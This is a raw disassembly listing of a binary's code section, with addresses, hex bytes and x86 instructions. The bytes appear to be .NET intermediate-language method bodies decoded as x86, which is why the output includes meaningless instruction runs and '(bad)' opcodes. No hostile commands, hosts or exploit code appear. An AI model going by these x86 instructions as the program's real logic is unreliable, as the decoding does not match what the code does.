  403ce8:	15 0c 00 00 1b       	adc    $0x1b00000c,%eax
  403ced:	02 15 25 0a 7d 3e    	add    0x3e7d0a25,%dl
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	04 12                	add    $0x12,%al
  403cf7:	06                   	push   %es
  403cf8:	28 69 00             	sub    %ch,0x0(%ecx)
  403cfb:	00 0a                	add    %cl,(%edx)
  403cfd:	20 e8                	and    %ch,%al
  403cff:	03 00                	add    (%eax),%eax
  403d01:	00 5c 13 07          	add    %bl,0x7(%ebx,%edx,1)
  403d05:	12 07                	adc    (%edi),%al
  403d07:	28 6a 00             	sub    %ch,0x0(%edx)
  403d0a:	00 0a                	add    %cl,(%edx)
  403d0c:	0b 02                	or     (%edx),%eax
  403d0e:	7b 41                	jnp    0x403d51
  403d10:	00 00                	add    %al,(%eax)
  403d12:	04 72                	add    $0x72,%al
  403d14:	7d 00                	jge    0x403d16
  403d16:	00 70 07             	add    %dh,0x7(%eax)
  403d19:	28 6b 00             	sub    %ch,0x0(%ebx)
  403d1c:	00 0a                	add    %cl,(%edx)
  403d1e:	0c 28                	or     $0x28,%al
  403d20:	27                   	daa
  403d21:	00 00                	add    %al,(%eax)
  403d23:	0a 08                	or     (%eax),%cl
  403d25:	6f                   	outsl  %ds:(%esi),(%dx)
  403d26:	3b 00                	cmp    (%eax),%eax
  403d28:	00 0a                	add    %cl,(%edx)
  403d2a:	0d 02 7b 40 00       	or     $0x407b02,%eax
  403d2f:	00 04 09             	add    %al,(%ecx,%ecx,1)
  403d32:	6f                   	outsl  %ds:(%esi),(%dx)
  403d33:	32 00                	xor    (%eax),%al
  403d35:	00 06                	add    %al,(%esi)
  403d37:	6f                   	outsl  %ds:(%esi),(%dx)
  403d38:	2b 00                	sub    (%eax),%eax
  403d3a:	00 0a                	add    %cl,(%edx)
  403d3c:	13 08                	adc    (%eax),%ecx
  403d3e:	12 08                	adc    (%eax),%cl
  403d40:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  403d43:	00 0a                	add    %cl,(%edx)
  403d45:	2d 3e 02 18 25       	sub    $0x2518023e,%eax
  403d4a:	0a 7d 3e             	or     0x3e(%ebp),%bh
  403d4d:	00 00                	add    %al,(%eax)
  403d4f:	04 02                	add    $0x2,%al
  403d51:	11 08                	adc    %ecx,(%eax)
  403d53:	7d 44                	jge    0x403d99
  403d55:	00 00                	add    %al,(%eax)
  403d57:	04 02                	add    $0x2,%al
  403d59:	7c 3f                	jl     0x403d9a
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	04 12                	add    $0x12,%al
  403d5f:	08 02                	or     %al,(%edx)
  403d61:	28 1f                	sub    %bl,(%edi)
  403d63:	00 00                	add    %al,(%eax)
  403d65:	2b de                	sub    %esi,%ebx
  403d67:	61                   	popa
  403d68:	02 7b 44             	add    0x44(%ebx),%bh
  403d6b:	00 00                	add    %al,(%eax)
  403d6d:	04 13                	add    $0x13,%al
  403d6f:	08 02                	or     %al,(%edx)
  403d71:	7c 44                	jl     0x403db7
  403d73:	00 00                	add    %al,(%eax)
  403d75:	04 fe                	add    $0xfe,%al
  403d77:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403d7c:	02 15 25 0a 7d 3e    	add    0x3e7d0a25,%dl
  403d82:	00 00                	add    %al,(%eax)
  403d84:	04 12                	add    $0x12,%al
  403d86:	08 28                	or     %ch,(%eax)
  403d88:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  403d8d:	de 20                	fisubs (%eax)
  403d8f:	13 09                	adc    (%ecx),%ecx
  403d91:	02 1f                	add    (%edi),%bl
  403d93:	fe                   	(bad)
  403d94:	7d 3e                	jge    0x403dd4
  403d96:	00 00                	add    %al,(%eax)
  403d98:	04 02                	add    $0x2,%al
  403d9a:	14 7d                	adc    $0x7d,%al
  403d9c:	41                   	inc    %ecx
  403d9d:	00 00                	add    %al,(%eax)
  403d9f:	04 02                	add    $0x2,%al
  403da1:	7c 3f                	jl     0x403de2
  403da3:	00 00                	add    %al,(%eax)
  403da5:	04 11                	add    $0x11,%al
  403da7:	09 28                	or     %ebp,(%eax)
  403da9:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  403dae:	1a 02                	sbb    (%edx),%al
  403db0:	1f                   	pop    %ds
  403db1:	fe                   	(bad)
  403db2:	7d 3e                	jge    0x403df2
  403db4:	00 00                	add    %al,(%eax)
  403db6:	04 02                	add    $0x2,%al
  403db8:	14 7d                	adc    $0x7d,%al
  403dba:	41                   	inc    %ecx
  403dbb:	00 00                	add    %al,(%eax)
  403dbd:	04 02                	add    $0x2,%al
  403dbf:	7c 3f                	jl     0x403e00
  403dc1:	00 00                	add    %al,(%eax)
  403dc3:	04 28                	add    $0x28,%al
  403dc5:	3e 00 00             	add    %al,%ds:(%eax)
  403dc8:	0a 2a                	or     (%edx),%ch
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	41                   	inc    %ecx
  403dcd:	1c 00                	sbb    $0x0,%al
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	00 07                	add    %al,(%edi)
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	00 68 01             	add    %ch,0x1(%eax)
  403dda:	00 00                	add    %al,(%eax)
  403ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  403ddd:	01 00                	add    %eax,(%eax)
  403ddf:	00 20                	add    %ah,(%eax)
  403de1:	00 00                	add    %al,(%eax)
  403de3:	00 0b                	add    %cl,(%ebx)
  403de5:	00 00                	add    %al,(%eax)
  403de7:	01 13                	add    %edx,(%ebx)
  403de9:	30 02                	xor    %al,(%edx)
  403deb:	00 2b                	add    %ch,(%ebx)
  403ded:	00 00                	add    %al,(%eax)
  403def:	00 15 00 00 11 12    	add    %dl,0x12110000
  403df5:	00 28                	add    %ch,(%eax)
  403df7:	6e                   	outsb  %ds:(%esi),(%dx)
  403df8:	00 00                	add    %al,(%eax)
  403dfa:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	04 12                	add    $0x12,%al
  403e01:	00 02                	add    %al,(%edx)
  403e03:	7d 4e                	jge    0x403e53
  403e05:	00 00                	add    %al,(%eax)
  403e07:	04 12                	add    $0x12,%al
  403e09:	00 15 7d 4c 00 00    	add    %dl,0x4c7d
  403e0f:	04 12                	add    $0x12,%al
  403e11:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  403e15:	00 04 12             	add    %al,(%edx,%edx,1)
  403e18:	00 28                	add    %ch,(%eax)
  403e1a:	20 00                	and    %al,(%eax)
  403e1c:	00 2b                	add    %ch,(%ebx)
  403e1e:	2a 00                	sub    (%eax),%al
  403e20:	13 30                	adc    (%eax),%esi
  403e22:	02 00                	add    (%eax),%al
  403e24:	4f                   	dec    %edi
  403e25:	00 00                	add    %al,(%eax)
  403e27:	00 16                	add    %dl,(%esi)
  403e29:	00 00                	add    %al,(%eax)
  403e2b:	11 12                	adc    %edx,(%edx)
  403e2d:	00 28                	add    %ch,(%eax)
  403e2f:	70 00                	jo     0x403e31
  403e31:	00 0a                	add    %cl,(%edx)
  403e33:	7d 51                	jge    0x403e86
  403e35:	00 00                	add    %al,(%eax)
  403e37:	04 12                	add    $0x12,%al
  403e39:	00 02                	add    %al,(%edx)
  403e3b:	7d 52                	jge    0x403e8f
  403e3d:	00 00                	add    %al,(%eax)
  403e3f:	04 12                	add    $0x12,%al
  403e41:	00 03                	add    %al,(%ebx)
  403e43:	7d 53                	jge    0x403e98
  403e45:	00 00                	add    %al,(%eax)
  403e47:	04 12                	add    $0x12,%al
  403e49:	00 04 7d 55 00 00 04 	add    %al,0x4000055(,%edi,2)
  403e50:	12 00                	adc    (%eax),%al
  403e52:	05 7d 54 00 00       	add    $0x547d,%eax
  403e57:	04 12                	add    $0x12,%al
  403e59:	00 15 7d 50 00 00    	add    %dl,0x507d
  403e5f:	04 12                	add    $0x12,%al
  403e61:	00 7c 51 00          	add    %bh,0x0(%ecx,%edx,2)
  403e65:	00 04 12             	add    %al,(%edx,%edx,1)
  403e68:	00 28                	add    %ch,(%eax)
  403e6a:	21 00                	and    %eax,(%eax)
  403e6c:	00 2b                	add    %ch,(%ebx)
  403e6e:	12 00                	adc    (%eax),%al
  403e70:	7c 51                	jl     0x403ec3
  403e72:	00 00                	add    %al,(%eax)
  403e74:	04 28                	add    $0x28,%al
  403e76:	72 00                	jb     0x403e78
  403e78:	00 0a                	add    %cl,(%edx)
  403e7a:	2a 00                	sub    (%eax),%al
  403e7c:	1b 30                	sbb    (%eax),%esi
  403e7e:	01 00                	add    %eax,(%eax)
  403e80:	1a 00                	sbb    (%eax),%al
  403e82:	00 00                	add    %al,(%eax)
  403e84:	17                   	pop    %ss
  403e85:	00 00                	add    %al,(%eax)
  403e87:	11 02                	adc    %eax,(%edx)
  403e89:	7b 47                	jnp    0x403ed2
  403e8b:	00 00                	add    %al,(%eax)
  403e8d:	04 7b                	add    $0x7b,%al
  403e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e90:	00 00                	add    %al,(%eax)
  403e92:	04 6f                	add    $0x6f,%al
  403e94:	73 00                	jae    0x403e96
  403e96:	00 0a                	add    %cl,(%edx)
  403e98:	0a de                	or     %dh,%bl
  403e9a:	05 26 16 0a de       	add    $0xde0a1626,%eax
  403e9f:	00 06                	add    %al,(%esi)
  403ea1:	2a 00                	sub    (%eax),%al
  403ea3:	00 01                	add    %al,(%ecx)
  403ea5:	10 00                	adc    %al,(%eax)
  403ea7:	00 00                	add    %al,(%eax)
  403ea9:	00 00                	add    %al,(%eax)
  403eab:	00 13                	add    %dl,(%ebx)
  403ead:	13 00                	adc    (%eax),%eax
  403eaf:	05 01 00 00 01       	add    $0x1000001,%eax
  403eb4:	13 30                	adc    (%eax),%esi
  403eb6:	02 00                	add    (%eax),%al
  403eb8:	37                   	aaa
  403eb9:	00 00                	add    %al,(%eax)
  403ebb:	00 18                	add    %bl,(%eax)
  403ebd:	00 00                	add    %al,(%eax)
  403ebf:	11 12                	adc    %edx,(%edx)
  403ec1:	00 28                	add    %ch,(%eax)
  403ec3:	74 00                	je     0x403ec5
  403ec5:	00 0a                	add    %cl,(%edx)
  403ec7:	7d 5c                	jge    0x403f25
  403ec9:	00 00                	add    %al,(%eax)
  403ecb:	04 12                	add    $0x12,%al
  403ecd:	00 02                	add    %al,(%edx)
  403ecf:	7d 5d                	jge    0x403f2e
  403ed1:	00 00                	add    %al,(%eax)
  403ed3:	04 12                	add    $0x12,%al
  403ed5:	00 15 7d 5b 00 00    	add    %dl,0x5b7d
  403edb:	04 12                	add    $0x12,%al
  403edd:	00 7c 5c 00          	add    %bh,0x0(%esp,%ebx,2)
  403ee1:	00 04 12             	add    %al,(%edx,%edx,1)
  403ee4:	00 28                	add    %ch,(%eax)
  403ee6:	22 00                	and    (%eax),%al
  403ee8:	00 2b                	add    %ch,(%ebx)
  403eea:	12 00                	adc    (%eax),%al
  403eec:	7c 5c                	jl     0x403f4a
  403eee:	00 00                	add    %al,(%eax)
  403ef0:	04 28                	add    $0x28,%al
  403ef2:	76 00                	jbe    0x403ef4
  403ef4:	00 0a                	add    %cl,(%edx)
  403ef6:	2a 00                	sub    (%eax),%al
  403ef8:	13 30                	adc    (%eax),%esi
  403efa:	02 00                	add    (%eax),%al
  403efc:	3f                   	aas
  403efd:	00 00                	add    %al,(%eax)
  403eff:	00 19                	add    %bl,(%ecx)
  403f01:	00 00                	add    %al,(%eax)
  403f03:	11 12                	adc    %edx,(%edx)
  403f05:	00 28                	add    %ch,(%eax)
  403f07:	77 00                	ja     0x403f09
  403f09:	00 0a                	add    %cl,(%edx)
  403f0b:	7d 60                	jge    0x403f6d
  403f0d:	00 00                	add    %al,(%eax)
  403f0f:	04 12                	add    $0x12,%al
  403f11:	00 02                	add    %al,(%edx)
  403f13:	7d 61                	jge    0x403f76
  403f15:	00 00                	add    %al,(%eax)
  403f17:	04 12                	add    $0x12,%al
  403f19:	00 03                	add    %al,(%ebx)
  403f1b:	7d 62                	jge    0x403f7f
  403f1d:	00 00                	add    %al,(%eax)
  403f1f:	04 12                	add    $0x12,%al
  403f21:	00 15 7d 5f 00 00    	add    %dl,0x5f7d
  403f27:	04 12                	add    $0x12,%al
  403f29:	00 7c 60 00          	add    %bh,0x0(%eax,%eiz,2)
  403f2d:	00 04 12             	add    %al,(%edx,%edx,1)
  403f30:	00 28                	add    %ch,(%eax)
  403f32:	23 00                	and    (%eax),%eax
  403f34:	00 2b                	add    %ch,(%ebx)
  403f36:	12 00                	adc    (%eax),%al
  403f38:	7c 60                	jl     0x403f9a
  403f3a:	00 00                	add    %al,(%eax)
  403f3c:	04 28                	add    $0x28,%al
  403f3e:	79 00                	jns    0x403f40
  403f40:	00 0a                	add    %cl,(%edx)
  403f42:	2a 00                	sub    (%eax),%al
  403f44:	13 30                	adc    (%eax),%esi
  403f46:	02 00                	add    (%eax),%al
  403f48:	47                   	inc    %edi
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	00 1a                	add    %bl,(%edx)
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	11 12                	adc    %edx,(%edx)
  403f51:	00 28                	add    %ch,(%eax)
  403f53:	77 00                	ja     0x403f55
  403f55:	00 0a                	add    %cl,(%edx)
  403f57:	7d 65                	jge    0x403fbe
  403f59:	00 00                	add    %al,(%eax)
  403f5b:	04 12                	add    $0x12,%al
  403f5d:	00 02                	add    %al,(%edx)
  403f5f:	7d 66                	jge    0x403fc7
  403f61:	00 00                	add    %al,(%eax)
  403f63:	04 12                	add    $0x12,%al
  403f65:	00 03                	add    %al,(%ebx)
  403f67:	7d 67                	jge    0x403fd0
  403f69:	00 00                	add    %al,(%eax)
  403f6b:	04 12                	add    $0x12,%al
  403f6d:	00 04 7d 68 00 00 04 	add    %al,0x4000068(,%edi,2)
  403f74:	12 00                	adc    (%eax),%al
  403f76:	15 7d 64 00 00       	adc    $0x647d,%eax
  403f7b:	04 12                	add    $0x12,%al
  403f7d:	00 7c 65 00          	add    %bh,0x0(%ebp,%eiz,2)
  403f81:	00 04 12             	add    %al,(%edx,%edx,1)
  403f84:	00 28                	add    %ch,(%eax)
  403f86:	24 00                	and    $0x0,%al
  403f88:	00 2b                	add    %ch,(%ebx)
  403f8a:	12 00                	adc    (%eax),%al
  403f8c:	7c 65                	jl     0x403ff3
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	04 28                	add    $0x28,%al
  403f92:	79 00                	jns    0x403f94
  403f94:	00 0a                	add    %cl,(%edx)
  403f96:	2a 00                	sub    (%eax),%al
  403f98:	1b 30                	sbb    (%eax),%esi
  403f9a:	05 00 7c 01 00       	add    $0x17c00,%eax
  403f9f:	00 1b                	add    %bl,(%ebx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	11 02                	adc    %eax,(%edx)
  403fa5:	7b 4c                	jnp    0x403ff3
  403fa7:	00 00                	add    %al,(%eax)
  403fa9:	04 0a                	add    $0xa,%al
  403fab:	02 7b 4e             	add    0x4e(%ebx),%bh
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	04 0b                	add    $0xb,%al
  403fb2:	06                   	push   %es
  403fb3:	26 00 06             	add    %al,%es:(%esi)
  403fb6:	2c 7a                	sub    $0x7a,%al
  403fb8:	07                   	pop    %es
  403fb9:	7b 47                	jnp    0x404002
  403fbb:	00 00                	add    %al,(%eax)
  403fbd:	04 7b                	add    $0x7b,%al
  403fbf:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc0:	00 00                	add    %al,(%eax)
  403fc2:	04 39                	add    $0x39,%al
  403fc4:	8d 00                	lea    (%eax),%eax
  403fc6:	00 00                	add    %al,(%eax)
  403fc8:	28 7a 00             	sub    %bh,0x0(%edx)
  403fcb:	00 0a                	add    %cl,(%edx)
  403fcd:	07                   	pop    %es
  403fce:	7b 47                	jnp    0x404017
  403fd0:	00 00                	add    %al,(%eax)
  403fd2:	04 7b                	add    $0x7b,%al
  403fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	04 fe                	add    $0xfe,%al
  403fd9:	06                   	push   %es
  403fda:	7b 00                	jnp    0x403fdc
  403fdc:	00 0a                	add    %cl,(%edx)
  403fde:	73 7c                	jae    0x40405c
  403fe0:	00 00                	add    %al,(%eax)
  403fe2:	0a 07                	or     (%edi),%al
  403fe4:	7b 47                	jnp    0x40402d
  403fe6:	00 00                	add    %al,(%eax)
  403fe8:	04 7b                	add    $0x7b,%al
  403fea:	6f                   	outsl  %ds:(%esi),(%dx)
  403feb:	00 00                	add    %al,(%eax)
  403fed:	04 fe                	add    $0xfe,%al
  403fef:	06                   	push   %es
  403ff0:	7d 00                	jge    0x403ff2
  403ff2:	00 0a                	add    %cl,(%edx)
  403ff4:	73 7e                	jae    0x404074
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	0a 17                	or     (%edi),%dl
  403ffa:	14 6f                	adc    $0x6f,%al
  403ffc:	25 00 00 2b 6f       	and    $0x6f2b0000,%eax
  404001:	37                   	aaa
  404002:	00 00                	add    %al,(%eax)
  404004:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  40400a:	00 00                	add    %al,(%eax)
  40400c:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  404012:	0a 7d 4c             	or     0x4c(%ebp),%bh
  404015:	00 00                	add    %al,(%eax)
  404017:	04 02                	add    $0x2,%al
  404019:	09 7d 4f             	or     %edi,0x4f(%ebp)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	04 02                	add    $0x2,%al
  404020:	7c 4d                	jl     0x40406f
  404022:	00 00                	add    %al,(%eax)
  404024:	04 12                	add    $0x12,%al
  404026:	03 02                	add    (%edx),%eax
  404028:	28 26                	sub    %ah,(%esi)
  40402a:	00 00                	add    %al,(%eax)
  40402c:	2b dd                	sub    %ebp,%ebx
  40402e:	ed                   	in     (%dx),%eax
  40402f:	00 00                	add    %al,(%eax)
  404031:	00 02                	add    %al,(%edx)
  404033:	7b 4f                	jnp    0x404084
  404035:	00 00                	add    %al,(%eax)
  404037:	04 0d                	add    $0xd,%al
  404039:	02 7c 4f 00          	add    0x0(%edi,%ecx,2),%bh
  40403d:	00 04 fe             	add    %al,(%esi,%edi,8)
  404040:	15 0a 00 00 01       	adc    $0x100000a,%eax
  404045:	02 15 25 0a 7d 4c    	add    0x4c7d0a25,%dl
  40404b:	00 00                	add    %al,(%eax)
  40404d:	04 12                	add    $0x12,%al
  40404f:	03 28                	add    (%eax),%ebp
  404051:	39 00                	cmp    %eax,(%eax)
  404053:	00 0a                	add    %cl,(%edx)
  404055:	de 1a                	ficomps (%edx)
  404057:	26 07                	es pop %es
  404059:	7b 47                	jnp    0x4040a2
  40405b:	00 00                	add    %al,(%eax)
  40405d:	04 7b                	add    $0x7b,%al
  40405f:	6f                   	outsl  %ds:(%esi),(%dx)
  404060:	00 00                	add    %al,(%eax)
  404062:	04 25                	add    $0x25,%al
  404064:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  404069:	16                   	push   %ss
  40406a:	28 81 00 00 0a de    	sub    %al,-0x21f60000(%ecx)
  404070:	00 07                	add    %al,(%edi)
  404072:	7b 47                	jnp    0x4040bb
  404074:	00 00                	add    %al,(%eax)
  404076:	04 7b                	add    $0x7b,%al
  404078:	6f                   	outsl  %ds:(%esi),(%dx)
  404079:	00 00                	add    %al,(%eax)
  40407b:	04 25                	add    $0x25,%al
  40407d:	2d 03 26 2b 05       	sub    $0x52b2603,%eax
  404082:	28 82 00 00 0a 07    	sub    %al,0x70a0000(%edx)
  404088:	7b 46                	jnp    0x4040d0
  40408a:	00 00                	add    %al,(%eax)
  40408c:	04 28                	add    $0x28,%al
  40408e:	27                   	daa
  40408f:	00 00                	add    %al,(%eax)
  404091:	2b 0c 07             	sub    (%edi,%eax,1),%ecx
  404094:	7b 46                	jnp    0x4040dc
  404096:	00 00                	add    %al,(%eax)
  404098:	04 6f                	add    $0x6f,%al
  40409a:	84 00                	test   %al,(%eax)
  40409c:	00 0a                	add    %cl,(%edx)
  40409e:	08 6f 85             	or     %ch,-0x7b(%edi)
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 13                	or     (%ebx),%dl
  4040a5:	04 2b                	add    $0x2b,%al
  4040a7:	12 12                	adc    (%edx),%dl
  4040a9:	04 28                	add    $0x28,%al
  4040ab:	86 00                	xchg   %al,(%eax)
  4040ad:	00 0a                	add    %cl,(%edx)
  4040af:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  4040b4:	05 28 2e 00 00       	add    $0x2e28,%eax
  4040b9:	06                   	push   %es
  4040ba:	12 04 28             	adc    (%eax,%ebp,1),%al
  4040bd:	87 00                	xchg   %eax,(%eax)
  4040bf:	00 0a                	add    %cl,(%edx)
  4040c1:	2d e5 de 12 06       	sub    $0x612dee5,%eax
  4040c6:	16                   	push   %ss
  4040c7:	2f                   	das
  4040c8:	0d 12 04 fe 16       	or     $0x16fe0412,%eax
  4040cd:	13 00                	adc    (%eax),%eax
  4040cf:	00 1b                	add    %bl,(%ebx)
  4040d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d2:	4b                   	dec    %ebx
  4040d3:	00 00                	add    %al,(%eax)
  4040d5:	0a dc                	or     %ah,%bl
  4040d7:	08 6f 84             	or     %ch,-0x7c(%edi)
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	0a 07                	or     (%edi),%al
  4040de:	7b 45                	jnp    0x404125
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	04 2c                	add    $0x2c,%al
  4040e4:	0c 07                	or     $0x7,%al
  4040e6:	7b 45                	jnp    0x40412d
  4040e8:	00 00                	add    %al,(%eax)
  4040ea:	04 07                	add    $0x7,%al
  4040ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ed:	88 00                	mov    %al,(%eax)
  4040ef:	00 0a                	add    %cl,(%edx)
  4040f1:	de 19                	ficomps (%ecx)
  4040f3:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  4040f9:	4c                   	dec    %esp
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	04 02                	add    $0x2,%al
  4040fe:	7c 4d                	jl     0x40414d
  404100:	00 00                	add    %al,(%eax)
  404102:	04 11                	add    $0x11,%al
  404104:	05 28 89 00 00       	add    $0x8928,%eax
  404109:	0a de                	or     %dh,%bl
  40410b:	13 02                	adc    (%edx),%eax
  40410d:	1f                   	pop    %ds
  40410e:	fe                   	(bad)
  40410f:	7d 4c                	jge    0x40415d
  404111:	00 00                	add    %al,(%eax)
  404113:	04 02                	add    $0x2,%al
  404115:	7c 4d                	jl     0x404164
  404117:	00 00                	add    %al,(%eax)
  404119:	04 28                	add    $0x28,%al
  40411b:	8a 00                	mov    (%eax),%al
  40411d:	00 0a                	add    %cl,(%edx)
  40411f:	2a 41 4c             	sub    0x4c(%ecx),%al
  404122:	00 00                	add    %al,(%eax)
  404124:	00 00                	add    %al,(%eax)
  404126:	00 00                	add    %al,(%eax)
  404128:	11 00                	adc    %eax,(%eax)
  40412a:	00 00                	add    %al,(%eax)
  40412c:	a2 00 00 00 b3       	mov    %al,0xb3000000
  404131:	00 00                	add    %al,(%eax)
  404133:	00 1a                	add    %bl,(%edx)
  404135:	00 00                	add    %al,(%eax)
  404137:	00 01                	add    %al,(%ecx)
  404139:	00 00                	add    %al,(%eax)
  40413b:	01 02                	add    %eax,(%edx)
  40413d:	00 00                	add    %al,(%eax)
  40413f:	00 02                	add    %al,(%edx)
  404141:	01 00                	add    %eax,(%eax)
  404143:	00 1f                	add    %bl,(%edi)
  404145:	00 00                	add    %al,(%eax)
  404147:	00 21                	add    %ah,(%ecx)
  404149:	01 00                	add    %eax,(%eax)
  40414b:	00 12                	add    %dl,(%edx)
	...
  404155:	00 00                	add    %al,(%eax)
  404157:	00 0e                	add    %cl,(%esi)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 41 01             	add    %al,0x1(%ecx)
  40415e:	00 00                	add    %al,(%eax)
  404160:	4f                   	dec    %edi
  404161:	01 00                	add    %eax,(%eax)
  404163:	00 19                	add    %bl,(%ecx)
  404165:	00 00                	add    %al,(%eax)
  404167:	00 0b                	add    %cl,(%ebx)
  404169:	00 00                	add    %al,(%eax)
  40416b:	01 1b                	add    %ebx,(%ebx)
  40416d:	30 05 00 cf 02 00    	xor    %al,0x2cf00
  404173:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404176:	00 11                	add    %dl,(%ecx)
  404178:	02 7b 50             	add    0x50(%ebx),%bh
  40417b:	00 00                	add    %al,(%eax)
  40417d:	04 0a                	add    $0xa,%al
  40417f:	02 7b 52             	add    0x52(%ebx),%bh
  404182:	00 00                	add    %al,(%eax)
  404184:	04 0b                	add    $0xb,%al
  404186:	06                   	push   %es
  404187:	19 36                	sbb    %esi,(%esi)
  404189:	09 06                	or     %eax,(%esi)
  40418b:	1a 3b                	sbb    (%ebx),%bh
  40418d:	5f                   	pop    %edi
  40418e:	02 00                	add    (%eax),%al
  404190:	00 16                	add    %dl,(%esi)
  404192:	0d 00 06 45 04       	or     $0x4450600,%eax
  404197:	00 00                	add    %al,(%eax)
  404199:	00 5d 00             	add    %bl,0x0(%ebp)
  40419c:	00 00                	add    %al,(%eax)
  40419e:	dd 00                	fldl   (%eax)
  4041a0:	00 00                	add    %al,(%eax)
  4041a2:	5e                   	pop    %esi
  4041a3:	01 00                	add    %eax,(%eax)
  4041a5:	00 cb                	add    %cl,%bl
  4041a7:	01 00                	add    %eax,(%eax)
  4041a9:	00 02                	add    %al,(%edx)
  4041ab:	18 17                	sbb    %dl,(%edi)
  4041ad:	1c 73                	sbb    $0x73,%al
  4041af:	8c 00                	mov    %es,(%eax)
  4041b1:	00 0a                	add    %cl,(%edx)
  4041b3:	7d 56                	jge    0x40420b
  4041b5:	00 00                	add    %al,(%eax)
  4041b7:	04 02                	add    $0x2,%al
  4041b9:	7b 56                	jnp    0x404211
  4041bb:	00 00                	add    %al,(%eax)
  4041bd:	04 07                	add    $0x7,%al
  4041bf:	7b 47                	jnp    0x404208
  4041c1:	00 00                	add    %al,(%eax)
  4041c3:	04 7b                	add    $0x7b,%al
  4041c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	8d 00                	lea    (%eax),%eax
  4041cc:	00 0a                	add    %cl,(%edx)
  4041ce:	28 8e 00 00 0a 6f    	sub    %cl,0x6f0a0000(%esi)
  4041d4:	37                   	aaa
  4041d5:	00 00                	add    %al,(%eax)
  4041d7:	0a 13                	or     (%ebx),%dl
  4041d9:	06                   	push   %es
  4041da:	12 06                	adc    (%esi),%al
  4041dc:	28 38                	sub    %bh,(%eax)
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  4041e6:	0a 7d 50             	or     0x50(%ebp),%bh
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	04 02                	add    $0x2,%al
  4041ed:	11 06                	adc    %eax,(%esi)
  4041ef:	7d 58                	jge    0x404249
  4041f1:	00 00                	add    %al,(%eax)
  4041f3:	04 02                	add    $0x2,%al
  4041f5:	7c 51                	jl     0x404248
  4041f7:	00 00                	add    %al,(%eax)
  4041f9:	04 12                	add    $0x12,%al
  4041fb:	06                   	push   %es
  4041fc:	02 28                	add    (%eax),%ch
  4041fe:	28 00                	sub    %al,(%eax)
  404200:	00 2b                	add    %ch,(%ebx)
  404202:	dd 3f                	fnstsw (%edi)
  404204:	02 00                	add    (%eax),%al
  404206:	00 02                	add    %al,(%edx)
  404208:	7b 58                	jnp    0x404262
  40420a:	00 00                	add    %al,(%eax)
  40420c:	04 13                	add    $0x13,%al
  40420e:	06                   	push   %es
  40420f:	02 7c 58 00          	add    0x0(%eax,%ebx,2),%bh
  404213:	00 04 fe             	add    %al,(%esi,%edi,8)
  404216:	15 0a 00 00 01       	adc    $0x100000a,%eax
  40421b:	02 15 25 0a 7d 50    	add    0x507d0a25,%dl
  404221:	00 00                	add    %al,(%eax)
  404223:	04 12                	add    $0x12,%al
  404225:	06                   	push   %es
  404226:	28 39                	sub    %bh,(%ecx)
  404228:	00 00                	add    %al,(%eax)
  40422a:	0a 02                	or     (%edx),%al
  40422c:	7b 56                	jnp    0x404284
  40422e:	00 00                	add    %al,(%eax)
  404230:	04 07                	add    $0x7,%al
  404232:	7b 47                	jnp    0x40427b
  404234:	00 00                	add    %al,(%eax)
  404236:	04 7b                	add    $0x7b,%al
  404238:	70 00                	jo     0x40423a
  40423a:	00 04 02             	add    %al,(%edx,%eax,1)
  40423d:	7b 53                	jnp    0x404292
  40423f:	00 00                	add    %al,(%eax)
  404241:	04 07                	add    $0x7,%al
  404243:	7b 49                	jnp    0x40428e
  404245:	00 00                	add    %al,(%eax)
  404247:	04 02                	add    $0x2,%al
  404249:	7b 54                	jnp    0x40429f
  40424b:	00 00                	add    %al,(%eax)
  40424d:	04 28                	add    $0x28,%al
  40424f:	75 00                	jne    0x404251
  404251:	00 06                	add    %al,(%esi)
  404253:	6f                   	outsl  %ds:(%esi),(%dx)
  404254:	4e                   	dec    %esi
  404255:	00 00                	add    %al,(%eax)
  404257:	0a 13                	or     (%ebx),%dl
  404259:	08 12                	or     %dl,(%edx)
  40425b:	08 28                	or     %ch,(%eax)
  40425d:	4f                   	dec    %edi
  40425e:	00 00                	add    %al,(%eax)
  404260:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  404266:	0a 7d 50             	or     0x50(%ebp),%bh
  404269:	00 00                	add    %al,(%eax)
  40426b:	04 02                	add    $0x2,%al
